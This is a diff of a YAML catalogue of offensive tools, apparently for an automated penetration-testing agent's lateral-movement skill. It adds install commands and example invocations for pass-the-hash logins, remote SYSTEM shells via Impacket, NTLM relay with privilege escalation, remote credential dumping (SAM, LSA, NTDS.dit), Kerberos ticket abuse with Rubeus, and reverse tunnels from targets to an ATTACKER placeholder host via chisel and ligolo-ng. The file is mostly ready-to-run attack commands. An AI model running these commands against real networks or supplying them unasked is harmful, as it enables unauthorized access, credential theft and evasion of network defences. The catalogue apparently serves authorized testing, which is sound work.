@@ -1,92 +1,170 @@
 crackmapexec:
-  description: "Network penetration testing tool for lateral movement, password spraying, and command execution"
+  description: "Network pentest swiss army knife — spray, exec, enum across protocols"
   category: "network"
   install_cmd: "apt-get install -y crackmapexec"
   verify_cmd: "crackmapexec --version"
   examples:
     - "crackmapexec smb 192.168.1.0/24 -u user -p pass"
     - "crackmapexec smb target -u user -p pass -X whoami"
-    - "crackmapexec smb 192.168.1.0/24 -u user -H hash"
-    - "crackmapexec smb target --local-auth"
+    - "crackmapexec smb target -u user -H NTHASH"
+    - "crackmapexec smb target -u user -p pass -M rdp -o ACTION=enable"
+
+netexec:
+  description: "CrackMapExec successor — actively maintained, same interface"
+  category: "network"
+  install_cmd: "pip install netexec"
+  verify_cmd: "nxc --version"
+  examples:
+    - "nxc smb target -u user -p pass -x 'whoami'"
+    - "nxc smb target -u user -H NTHASH"
+    - "nxc winrm target -u user -p pass -x 'whoami'"
 
 impacket-psexec:
-  description: "Remotely execute commands via SMB using Impacket's psexec"
+  description: "Remote execution via SMB — creates service, returns SYSTEM shell"
   category: "windows"
-  install_cmd: "apt-get install -y impacket-scripts"
+  install_cmd: "apt-get install -y python3-impacket"
   verify_cmd: "which impacket-psexec"
   examples:
-    - "impacket-psexec target/user:pass@target hostname"
-    - "impacket-psexec -hashes :hash target/user@target hostname"
+    - "impacket-psexec domain/user:pass@target"
+    - "impacket-psexec -hashes :NTHASH domain/user@target"
+    - "impacket-psexec -k -no-pass domain/user@target"
 
 impacket-wmiexec:
-  description: "Remotely execute commands via WMI using Impacket's wmiexec"
+  description: "Remote execution via WMI — semi-interactive, no binary upload"
   category: "windows"
-  install_cmd: "apt-get install -y impacket-scripts"
+  install_cmd: "apt-get install -y python3-impacket"
   verify_cmd: "which impacket-wmiexec"
   examples:
-    - "impacket-wmiexec target/user:pass@target 'whoami'"
-    - "impacket-wmiexec -hashes :hash target/user@target 'ipconfig'"
+    - "impacket-wmiexec domain/user:pass@target"
+    - "impacket-wmiexec -hashes :NTHASH domain/user@target"
+    - "impacket-wmiexec -k -no-pass domain/user@target"
 
 impacket-smbexec:
-  description: "Remotely execute commands via SMB using Impacket's smbexec"
+  description: "Remote execution via SCM service creation — no binary upload"
   category: "windows"
-  install_cmd: "apt-get install -y impacket-scripts"
+  install_cmd: "apt-get install -y python3-impacket"
   verify_cmd: "which impacket-smbexec"
   examples:
-    - "impacket-smbexec target/user:pass@target hostname"
-    - "impacket-smbexec -hashes :hash target/user@target 'whoami'"
+    - "impacket-smbexec domain/user:pass@target"
+    - "impacket-smbexec -hashes :NTHASH domain/user@target"
+
+impacket-dcomexec:
+  description: "Remote execution via DCOM objects (MMC20, ShellBrowserWindow)"
+  category: "windows"
+  install_cmd: "apt-get install -y python3-impacket"
+  verify_cmd: "which impacket-dcomexec"
+  examples:
+    - "impacket-dcomexec domain/user:pass@target"
+    - "impacket-dcomexec -hashes :NTHASH domain/user@target"
+
+impacket-atexec:
+  description: "Remote execution via Windows Task Scheduler"
+  category: "windows"
+  install_cmd: "apt-get install -y python3-impacket"
+  verify_cmd: "which impacket-atexec"
+  examples:
+    - "impacket-atexec domain/user:pass@target 'whoami'"
+    - "impacket-atexec -hashes :NTHASH domain/user@target 'ipconfig'"
+
+impacket-ntlmrelayx:
+  description: "NTLM relay attack framework — relay auth to SMB, LDAP, HTTP targets"
+  category: "network"
+  install_cmd: "apt-get install -y python3-impacket"
+  verify_cmd: "which impacket-ntlmrelayx"
+  examples:
+    - "impacket-ntlmrelayx -t smb://target -smb2support -i"
+    - "impacket-ntlmrelayx -t ldap://DC_IP --escalate-user user"
 
 impacket-secretsdump:
-  description: "Extract secrets from Windows registry (part of Impacket)"
+  description: "Remote credential extraction — SAM, LSA, NTDS.dit, cached creds"
   category: "windows"
-  install_cmd: "apt-get install -y impacket-scripts"
+  install_cmd: "apt-get install -y python3-impacket"
   verify_cmd: "which impacket-secretsdump"
   examples:
-    - "impacket-secretsdump -hashes :hash target/user@target"
+    - "impacket-secretsdump -hashes :NTHASH domain/user@target"
 
 impacket-getST:
-  description: "Request Kerberos service ticket using Impacket's getST"
+  description: "Request Kerberos service tickets for S4U abuse"
   category: "windows"
-  install_cmd: "apt-get install -y impacket-scripts"
+  install_cmd: "apt-get install -y python3-impacket"
   verify_cmd: "which impacket-getST"
   examples:
-    - "impacket-getST -spn 'HTTP/target' -hashes :hash domain/user"
+    - "impacket-getST -spn 'cifs/target' -hashes :NTHASH domain/user"
 
-impacket-ticketConverter:
-  description: "Convert Kirbi tickets to CCACHE format using Impacket's ticketConverter"
+impacket-getTGT:
+  description: "Request Kerberos TGT using password or NTLM hash"
   category: "windows"
-  install_cmd: "apt-get install -y impacket-scripts"
-  verify_cmd: "which impacket-ticketConverter"
+  install_cmd: "apt-get install -y python3-impacket"
+  verify_cmd: "which impacket-getTGT"
   examples:
-    - "impacket-ticketConverter ticket.kirbi ticket.ccache"
-
-responder:
-  description: "LLMNR, NBT-NS, and MDNS poisoner and hash capture tool"
-  category: "network"
-  install_cmd: "apt-get install -y responder"
-  verify_cmd: "responder --help | head -n 1"
-  examples:
-    - "responder -I eth0"
-    - "responder -I eth0 -w"
+    - "impacket-getTGT -hashes :NTHASH domain/user"
 
 evil-winrm:
-  description: "WinRM shell for hacking with advanced features"
+  description: "WinRM shell with upload/download, PowerShell, pass-the-hash"
   category: "windows"
   install_cmd: "apt-get install -y evil-winrm"
   verify_cmd: "evil-winrm --help | head -n 1"
   examples:
     - "evil-winrm -i target -u user -p pass"
-    - "evil-winrm -i target -u user -H hash"
-    - "evil-winrm -i target -u user -p 'pass' -s /path/to/scripts"
+    - "evil-winrm -i target -u user -H NTHASH"
+    - "evil-winrm -i target -u user -p pass -s /scripts/ -e /exes/"
 
-freerdp:
-  description: "Remote Desktop Protocol client for Linux"
+xfreerdp:
+  description: "RDP client with pass-the-hash, drive mounting, dynamic resolution"
   category: "windows"
   install_cmd: "apt-get install -y freerdp2-x11"
   verify_cmd: "xfreerdp --version"
   examples:
-    - "xfreerdp /u:user /p:pass /v:target:3389"
-    - "xfreerdp /u:user /p:pass /v:target /dynamic-resolution"
+    - "xfreerdp /u:user /p:pass /v:target:3389 /dynamic-resolution"
+    - "xfreerdp /u:user /pth:NTHASH /v:target:3389"
+    - "xfreerdp /u:user /p:pass /v:target /drive:share,/tmp"
+
+rubeus:
+  description: "C# Kerberos abuse — ticket export, PTT, overpass-the-hash, S4U"
+  category: "windows"
+  install_cmd: "Compile from https://github.com/GhostPack/Rubeus"
+  verify_cmd: "Rubeus.exe help"
+  examples:
+    - "Rubeus.exe ptt /ticket:<base64>"
+    - "Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt"
+    - "Rubeus.exe dump /nowrap"
+
+chisel:
+  description: "HTTP tunnel — reverse SOCKS proxy and port forwarding through firewalls"
+  category: "pivoting"
+  install_cmd: "go install github.com/jpillora/chisel@latest"
+  verify_cmd: "chisel --version"
+  examples:
+    - "chisel server --reverse --port 8080"
+    - "chisel client ATTACKER:8080 R:1080:socks"
+    - "chisel client ATTACKER:8080 R:445:TARGET:445"
+
+ligolo-ng:
+  description: "TUN-based tunnel — full network access without proxychains"
+  category: "pivoting"
+  install_cmd: "go install github.com/nicocha30/ligolo-ng@latest"
+  verify_cmd: "ligolo-proxy --help"
+  examples:
+    - "ligolo-proxy -selfcert"
+    - "ligolo-agent -connect ATTACKER:11601 -ignore-cert"
+
+sshuttle:
+  description: "Transparent SSH-based VPN — route subnets through SSH"
+  category: "pivoting"
+  install_cmd: "apt-get install -y sshuttle"
+  verify_cmd: "sshuttle --version"
+  examples:
+    - "sshuttle -r user@jumphost 10.10.10.0/24"
+    - "sshuttle -r user@jumphost 10.10.10.0/24 --dns"
+
+socat:
+  description: "Multipurpose relay tool — port forwarding, encrypted tunnels"
+  category: "pivoting"
+  install_cmd: "apt-get install -y socat"
+  verify_cmd: "socat -V | head -n 2"
+  examples:
+    - "socat TCP-LISTEN:8080,fork TCP:TARGET:80"
+    - "socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:TARGET:80"
 
 sshpass:
   description: "Non-interactive SSH password provider for automation"
@@ -94,12 +172,20 @@ sshpass:
   install_cmd: "apt-get install -y sshpass"
   verify_cmd: "sshpass -V"
   examples:
-    - "sshpass -p 'password' ssh user@host 'whoami'"
+    - "sshpass -p 'password' ssh user@host"
     - "sshpass -p 'password' ssh -N -L 8080:localhost:80 user@host"
+
+responder:
+  description: "LLMNR/NBT-NS poisoner for capturing NTLMv2 hashes to relay"
+  category: "network"
+  install_cmd: "apt-get install -y responder"
+  verify_cmd: "responder --help | head -n 1"
+  examples:
+    - "responder -I eth0 -wrfv"
 
 summarize_movement_log:
   description: "Summarize lateral movement logs into JSON evidence"
-  category: "network"
+  category: "utility"
   install_cmd: "python3 --version"
   verify_cmd: "python3 skills/lateral_movement/scripts/summarize_movement_log.py --help"
   examples:
